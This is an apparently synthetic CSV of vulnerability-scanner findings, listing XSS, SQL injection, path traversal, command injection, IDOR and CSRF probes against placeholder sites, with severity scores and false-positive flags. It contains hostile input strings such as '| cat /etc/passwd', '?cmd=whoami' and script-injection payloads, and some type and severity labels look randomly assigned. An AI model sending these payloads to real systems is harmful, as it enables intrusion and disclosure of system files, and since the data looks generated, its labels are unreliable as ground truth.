id,type,url,method,param,payload,evidence,severity,risk_score,risk_level,is_false_positive
869,xss,https://testsite.org/user,DELETE,name,<img src=x onerror=alert(1)>,Payload <img src=x onerror=alert(1)> reflected in response,low,2.9,low,False
870,sql_injection,https://vulnerableapp.net/api/products,GET,product_id,1' OR '1'='1,SQL error in response: You have an error in your SQL syntax near '1' OR '1'='1',low,2.8,low,False
871,file_inclusion,https://securitytesting.io/api/products,PUT,exec,../../../etc/passwd,Successful exploitation with payload: ../../../etc/passwd,medium,3.6,low,False
872,idor,https://testsite.org/product,PUT,doc_id,358,Unauthorized access to resource doc_id=358,info,1.0,info,False
873,xss,https://webapp.com/checkout,DELETE,q,<img src=x onerror=alert(1)>,Payload <img src=x onerror=alert(1)> reflected in response,info,2.1,low,False
874,sql_injection,https://example.com/product,PUT,order_id,"' UNION SELECT 1,2,3 --","SQL error in response: You have an error in your SQL syntax near '' UNION SELECT 1,2,3 --'",high,8.1,critical,False
875,csrf,https://vulnerableapp.net/user,POST,,,No CSRF token found in form submission,medium,6.0,high,False
876,csrf,https://testsite.org/profile,POST,,,No CSRF token found in form submission,high,8.0,critical,False
877,csrf,https://securitytesting.io/api/users,DELETE,,,No CSRF token found in form submission,medium,4.9,medium,False
878,file_inclusion,https://example.com/search,GET,file,../../../etc/passwd,Successful exploitation with payload: ../../../etc/passwd,critical,9.1,critical,True
879,csrf,https://example.com/cart,PUT,,,No CSRF token found in form submission,critical,7.6,high,False
880,file_inclusion,https://securitytesting.io/register,GET,file,| cat /etc/passwd,Successful exploitation with payload: | cat /etc/passwd,critical,9.1,critical,False
881,file_inclusion,https://vulnerableapp.net/api/users,DELETE,file,../../../etc/passwd,Successful exploitation with payload: ../../../etc/passwd,medium,4.9,medium,True
882,file_inclusion,https://webapp.com/checkout,DELETE,file,?cmd=whoami,Successful exploitation with payload: ?cmd=whoami,high,5.6,medium,True
883,file_inclusion,https://securitytesting.io/login,PUT,cmd,?cmd=whoami,Successful exploitation with payload: ?cmd=whoami,low,2.2,low,True
884,sql_injection,https://webapp.com/profile,DELETE,product_id,1' OR '1'='1,SQL error in response: You have an error in your SQL syntax near '1' OR '1'='1',high,7.5,high,False
885,xss,https://example.com/user,PUT,q,"""><script>alert(1)</script>","Payload ""><script>alert(1)</script> reflected in response",high,7.8,high,True
886,sql_injection,https://webapp.com/product,PUT,product_id,admin'--,SQL error in response: You have an error in your SQL syntax near 'admin'--',medium,6.3,high,True
887,sql_injection,https://webapp.com/api/products,PUT,id,"' UNION SELECT 1,2,3 --","SQL error in response: You have an error in your SQL syntax near '' UNION SELECT 1,2,3 --'",medium,5.8,medium,False
888,file_inclusion,https://example.com/api/users,DELETE,exec,?cmd=whoami,Successful exploitation with payload: ?cmd=whoami,high,7.8,high,True
889,file_inclusion,https://example.com/api/products,GET,url,?cmd=whoami,Successful exploitation with payload: ?cmd=whoami,low,3.0,low,False
890,file_inclusion,https://webapp.com/user,DELETE,path,../../../etc/passwd,Successful exploitation with payload: ../../../etc/passwd,medium,4.7,medium,False
891,file_inclusion,https://example.com/settings,GET,url,?cmd=whoami,Successful exploitation with payload: ?cmd=whoami,medium,5.3,medium,False
892,xss,https://testsite.org/login,DELETE,search,<img src=x onerror=alert(1)>,Payload <img src=x onerror=alert(1)> reflected in response,medium,4.4,medium,False
893,csrf,https://testsite.org/admin,POST,,,No CSRF token found in form submission,info,0.1,info,False
894,xss,https://webapp.com/login,GET,name,"""><script>alert(1)</script>","Payload ""><script>alert(1)</script> reflected in response",low,3.1,low,False
895,idor,https://testsite.org/api/users,GET,account_id,161,Unauthorized access to resource account_id=161,critical,9.3,critical,False
896,sql_injection,https://vulnerableapp.net/profile,GET,order_id,"' UNION SELECT 1,2,3 --","SQL error in response: You have an error in your SQL syntax near '' UNION SELECT 1,2,3 --'",critical,10.0,critical,False
897,xss,https://testsite.org/checkout,PUT,name,<img src=x onerror=alert(1)>,Payload <img src=x onerror=alert(1)> reflected in response,low,3.1,low,False
898,idor,https://webapp.com/register,POST,account_id,567,Unauthorized access to resource account_id=567,low,3.0,low,False
899,xss,https://testsite.org/cart,GET,search,"""><script>alert(1)</script>","Payload ""><script>alert(1)</script> reflected in response",critical,10.0,critical,False
900,idor,https://testsite.org/admin,PUT,doc_id,159,Unauthorized access to resource doc_id=159,high,6.3,high,False
901,csrf,https://example.com/user,DELETE,,,No CSRF token found in form submission,medium,4.8,medium,False
902,file_inclusion,https://testsite.org/login,PUT,cmd,?cmd=whoami,Successful exploitation with payload: ?cmd=whoami,high,6.3,high,False
903,command_injection,https://example.com/search,GET,path,../../../etc/passwd,Successful exploitation with payload: ../../../etc/passwd,high,5.8,medium,False
904,xss,https://webapp.com/user,DELETE,q,<img src=x onerror=alert(1)>,Payload <img src=x onerror=alert(1)> reflected in response,medium,4.8,medium,False
905,command_injection,https://webapp.com/login,GET,cmd,../../../etc/passwd,Successful exploitation with payload: ../../../etc/passwd,high,5.2,medium,True
906,idor,https://securitytesting.io/api/products,DELETE,user_id,79,Unauthorized access to resource user_id=79,high,8.0,critical,False
907,csrf,https://webapp.com/checkout,PUT,,,No CSRF token found in form submission,high,6.2,high,False
908,file_inclusion,https://securitytesting.io/settings,POST,path,?cmd=whoami,Successful exploitation with payload: ?cmd=whoami,medium,6.0,high,False
909,file_inclusion,https://webapp.com/api/users,DELETE,url,| cat /etc/passwd,Successful exploitation with payload: | cat /etc/passwd,high,7.5,high,False
910,xss,https://vulnerableapp.net/settings,DELETE,q,"""><script>alert(1)</script>","Payload ""><script>alert(1)</script> reflected in response",high,6.3,high,False
911,csrf,https://securitytesting.io/product,GET,,,No CSRF token found in form submission,medium,3.7,low,False
912,command_injection,https://testsite.org/checkout,PUT,cmd,../../../etc/passwd,Successful exploitation with payload: ../../../etc/passwd,medium,4.3,medium,False
913,file_inclusion,https://example.com/login,POST,cmd,?cmd=whoami,Successful exploitation with payload: ?cmd=whoami,critical,7.6,high,False
914,csrf,https://vulnerableapp.net/cart,GET,,,No CSRF token found in form submission,critical,9.6,critical,False
915,csrf,https://securitytesting.io/settings,PUT,,,No CSRF token found in form submission,info,1.0,info,True
916,xss,https://example.com/register,PUT,message,<script>alert(1)</script>,Payload <script>alert(1)</script> reflected in response,medium,4.3,medium,False
917,file_inclusion,https://vulnerableapp.net/search,POST,url,../../../etc/passwd,Successful exploitation with payload: ../../../etc/passwd,medium,4.7,medium,False
918,idor,https://example.com/settings,DELETE,user_id,497,Unauthorized access to resource user_id=497,low,1.6,info,False
919,file_inclusion,https://example.com/login,PUT,url,?cmd=whoami,Successful exploitation with payload: ?cmd=whoami,info,1.6,info,False
920,file_inclusion,https://securitytesting.io/profile,POST,file,| cat /etc/passwd,Successful exploitation with payload: | cat /etc/passwd,critical,9.3,critical,False
921,csrf,https://example.com/search,POST,,,No CSRF token found in form submission,low,3.6,low,False
922,xss,https://testsite.org/api/users,GET,comment,<img src=x onerror=alert(1)>,Payload <img src=x onerror=alert(1)> reflected in response,critical,9.1,critical,False
923,sql_injection,https://webapp.com/login,PUT,id,1' OR '1'='1,SQL error in response: You have an error in your SQL syntax near '1' OR '1'='1',low,2.9,low,False
924,command_injection,https://webapp.com/api/users,PUT,file,?cmd=whoami,Successful exploitation with payload: ?cmd=whoami,high,6.8,high,False
925,csrf,https://webapp.com/register,PUT,,,No CSRF token found in form submission,high,5.9,medium,False
926,csrf,https://securitytesting.io/profile,GET,,,No CSRF token found in form submission,medium,4.2,medium,False
927,command_injection,https://vulnerableapp.net/product,PUT,file,| cat /etc/passwd,Successful exploitation with payload: | cat /etc/passwd,high,7.8,high,False
928,xss,https://example.com/cart,GET,q,<script>alert(1)</script>,Payload <script>alert(1)</script> reflected in response,medium,5.3,medium,False
929,idor,https://example.com/login,POST,user_id,212,Unauthorized access to resource user_id=212,info,1.9,info,False
930,xss,https://securitytesting.io/settings,PUT,q,<script>alert(1)</script>,Payload <script>alert(1)</script> reflected in response,medium,3.6,low,False
931,csrf,https://webapp.com/admin,DELETE,,,No CSRF token found in form submission,medium,5.5,medium,False
932,csrf,https://webapp.com/settings,DELETE,,,No CSRF token found in form submission,medium,3.7,low,False
933,idor,https://testsite.org/register,POST,account_id,522,Unauthorized access to resource account_id=522,high,8.7,critical,False
934,command_injection,https://vulnerableapp.net/admin,GET,url,?cmd=whoami,Successful exploitation with payload: ?cmd=whoami,low,3.5,low,False
935,idor,https://testsite.org/search,PUT,file_id,183,Unauthorized access to resource file_id=183,medium,4.2,medium,False
936,csrf,https://securitytesting.io/login,POST,,,No CSRF token found in form submission,high,6.1,high,True
937,idor,https://testsite.org/checkout,POST,user_id,615,Unauthorized access to resource user_id=615,medium,5.1,medium,False
938,idor,https://webapp.com/api/users,PUT,user_id,207,Unauthorized access to resource user_id=207,medium,3.5,low,False
939,file_inclusion,https://webapp.com/api/users,DELETE,file,| cat /etc/passwd,Successful exploitation with payload: | cat /etc/passwd,low,4.0,medium,False
940,csrf,https://vulnerableapp.net/search,POST,,,No CSRF token found in form submission,medium,4.6,medium,False
941,sql_injection,https://webapp.com/cart,POST,order_id,admin'--,SQL error in response: You have an error in your SQL syntax near 'admin'--',high,7.4,high,False
942,sql_injection,https://vulnerableapp.net/search,PUT,category_id,' OR 1=1 --,SQL error in response: You have an error in your SQL syntax near '' OR 1=1 --',low,3.4,low,False
943,xss,https://vulnerableapp.net/profile,DELETE,comment,"""><script>alert(1)</script>","Payload ""><script>alert(1)</script> reflected in response",medium,4.8,medium,False
944,csrf,https://vulnerableapp.net/product,DELETE,,,No CSRF token found in form submission,critical,8.1,critical,False
945,csrf,https://securitytesting.io/login,GET,,,No CSRF token found in form submission,high,7.2,high,True
946,xss,https://vulnerableapp.net/product,PUT,message,"""><script>alert(1)</script>","Payload ""><script>alert(1)</script> reflected in response",low,4.0,medium,False
947,command_injection,https://vulnerableapp.net/api/products,POST,path,?cmd=whoami,Successful exploitation with payload: ?cmd=whoami,critical,8.9,critical,False
948,file_inclusion,https://securitytesting.io/cart,PUT,file,| cat /etc/passwd,Successful exploitation with payload: | cat /etc/passwd,high,7.7,high,False
949,sql_injection,https://securitytesting.io/profile,PUT,product_id,admin'--,SQL error in response: You have an error in your SQL syntax near 'admin'--',medium,5.2,medium,False
950,file_inclusion,https://securitytesting.io/product,POST,cmd,?cmd=whoami,Successful exploitation with payload: ?cmd=whoami,high,6.7,high,False
951,csrf,https://vulnerableapp.net/settings,POST,,,No CSRF token found in form submission,info,0.1,info,False
952,csrf,https://vulnerableapp.net/checkout,POST,,,No CSRF token found in form submission,info,0.1,info,False
953,idor,https://example.com/login,POST,account_id,306,Unauthorized access to resource account_id=306,medium,5.1,medium,False
954,file_inclusion,https://testsite.org/cart,GET,url,| cat /etc/passwd,Successful exploitation with payload: | cat /etc/passwd,medium,4.8,medium,False
955,sql_injection,https://example.com/profile,GET,user_id,' OR 1=1 --,SQL error in response: You have an error in your SQL syntax near '' OR 1=1 --',medium,4.6,medium,False
956,xss,https://vulnerableapp.net/user,PUT,name,<img src=x onerror=alert(1)>,Payload <img src=x onerror=alert(1)> reflected in response,high,7.0,high,False
957,file_inclusion,https://testsite.org/api/products,PUT,url,?cmd=whoami,Successful exploitation with payload: ?cmd=whoami,medium,4.7,medium,False
958,csrf,https://webapp.com/product,POST,,,No CSRF token found in form submission,medium,6.4,high,True
959,file_inclusion,https://testsite.org/api/products,DELETE,path,../../../etc/passwd,Successful exploitation with payload: ../../../etc/passwd,medium,5.3,medium,True
960,sql_injection,https://testsite.org/search,GET,order_id,admin'--,SQL error in response: You have an error in your SQL syntax near 'admin'--',medium,5.4,medium,True
961,file_inclusion,https://securitytesting.io/search,POST,url,?cmd=whoami,Successful exploitation with payload: ?cmd=whoami,critical,9.0,critical,False
962,sql_injection,https://securitytesting.io/product,PUT,order_id,1' OR '1'='1,SQL error in response: You have an error in your SQL syntax near '1' OR '1'='1',medium,5.2,medium,True
963,csrf,https://testsite.org/api/users,DELETE,,,No CSRF token found in form submission,medium,4.5,medium,True
964,xss,https://testsite.org/api/users,GET,search,<img src=x onerror=alert(1)>,Payload <img src=x onerror=alert(1)> reflected in response,high,7.1,high,False
965,idor,https://example.com/login,GET,doc_id,228,Unauthorized access to resource doc_id=228,high,6.8,high,False
966,file_inclusion,https://securitytesting.io/settings,DELETE,url,../../../etc/passwd,Successful exploitation with payload: ../../../etc/passwd,medium,3.6,low,False
967,command_injection,https://webapp.com/admin,GET,path,../../../etc/passwd,Successful exploitation with payload: ../../../etc/passwd,info,0.8,info,False
968,file_inclusion,https://testsite.org/api/users,DELETE,exec,../../../etc/passwd,Successful exploitation with payload: ../../../etc/passwd,medium,4.9,medium,False
969,csrf,https://securitytesting.io/user,POST,,,No CSRF token found in form submission,high,7.9,high,True
970,idor,https://securitytesting.io/product,POST,account_id,185,Unauthorized access to resource account_id=185,low,2.0,low,True
971,file_inclusion,https://vulnerableapp.net/user,GET,path,| cat /etc/passwd,Successful exploitation with payload: | cat /etc/passwd,low,2.9,low,False
972,file_inclusion,https://vulnerableapp.net/api/users,POST,url,| cat /etc/passwd,Successful exploitation with payload: | cat /etc/passwd,medium,6.7,high,False
973,idor,https://testsite.org/login,GET,file_id,766,Unauthorized access to resource file_id=766,medium,4.0,medium,False
974,sql_injection,https://example.com/login,GET,product_id,admin'--,SQL error in response: You have an error in your SQL syntax near 'admin'--',low,3.1,low,False
975,idor,https://vulnerableapp.net/product,PUT,doc_id,367,Unauthorized access to resource doc_id=367,medium,5.8,medium,False
976,file_inclusion,https://securitytesting.io/product,POST,path,../../../etc/passwd,Successful exploitation with payload: ../../../etc/passwd,high,7.2,high,False
977,idor,https://testsite.org/checkout,PUT,doc_id,462,Unauthorized access to resource doc_id=462,info,0.1,info,False
978,file_inclusion,https://securitytesting.io/user,POST,file,| cat /etc/passwd,Successful exploitation with payload: | cat /etc/passwd,info,0.1,info,False
979,idor,https://webapp.com/search,PUT,doc_id,276,Unauthorized access to resource doc_id=276,medium,6.4,high,False
980,file_inclusion,https://testsite.org/checkout,PUT,url,../../../etc/passwd,Successful exploitation with payload: ../../../etc/passwd,info,2.7,low,False
981,command_injection,https://testsite.org/checkout,DELETE,url,../../../etc/passwd,Successful exploitation with payload: ../../../etc/passwd,info,1.4,info,True
982,sql_injection,https://vulnerableapp.net/user,PUT,user_id,1' OR '1'='1,SQL error in response: You have an error in your SQL syntax near '1' OR '1'='1',high,8.3,critical,False
983,idor,https://testsite.org/cart,GET,file_id,501,Unauthorized access to resource file_id=501,high,5.3,medium,False
984,csrf,https://webapp.com/profile,PUT,,,No CSRF token found in form submission,medium,4.5,medium,True
985,command_injection,https://example.com/api/users,GET,path,| cat /etc/passwd,Successful exploitation with payload: | cat /etc/passwd,info,1.6,info,False
986,idor,https://testsite.org/settings,PUT,doc_id,332,Unauthorized access to resource doc_id=332,low,4.8,medium,True
987,file_inclusion,https://example.com/cart,POST,file,../../../etc/passwd,Successful exploitation with payload: ../../../etc/passwd,high,6.2,high,False
988,csrf,https://webapp.com/product,POST,,,No CSRF token found in form submission,medium,5.4,medium,True
989,csrf,https://vulnerableapp.net/profile,POST,,,No CSRF token found in form submission,medium,3.4,low,False
990,idor,https://securitytesting.io/login,POST,account_id,438,Unauthorized access to resource account_id=438,low,3.9,low,False
991,idor,https://vulnerableapp.net/admin,DELETE,doc_id,841,Unauthorized access to resource doc_id=841,medium,6.2,high,True
992,command_injection,https://vulnerableapp.net/api/products,GET,exec,?cmd=whoami,Successful exploitation with payload: ?cmd=whoami,medium,5.5,medium,False
993,idor,https://vulnerableapp.net/cart,GET,account_id,855,Unauthorized access to resource account_id=855,high,7.1,high,True
994,idor,https://securitytesting.io/api/users,DELETE,account_id,786,Unauthorized access to resource account_id=786,low,2.0,low,False
995,file_inclusion,https://example.com/product,DELETE,path,| cat /etc/passwd,Successful exploitation with payload: | cat /etc/passwd,low,3.5,low,False
996,sql_injection,https://securitytesting.io/profile,PUT,category_id,' OR 1=1 --,SQL error in response: You have an error in your SQL syntax near '' OR 1=1 --',high,7.0,high,False
997,xss,https://testsite.org/settings,DELETE,q,"""><script>alert(1)</script>","Payload ""><script>alert(1)</script> reflected in response",info,1.1,info,False
998,idor,https://example.com/register,POST,user_id,388,Unauthorized access to resource user_id=388,high,6.1,high,False
999,idor,https://testsite.org/api/products,GET,doc_id,670,Unauthorized access to resource doc_id=670,low,2.7,low,True
1000,xss,https://securitytesting.io/product,POST,q,<script>alert(1)</script>,Payload <script>alert(1)</script> reflected in response,medium,4.8,medium,False
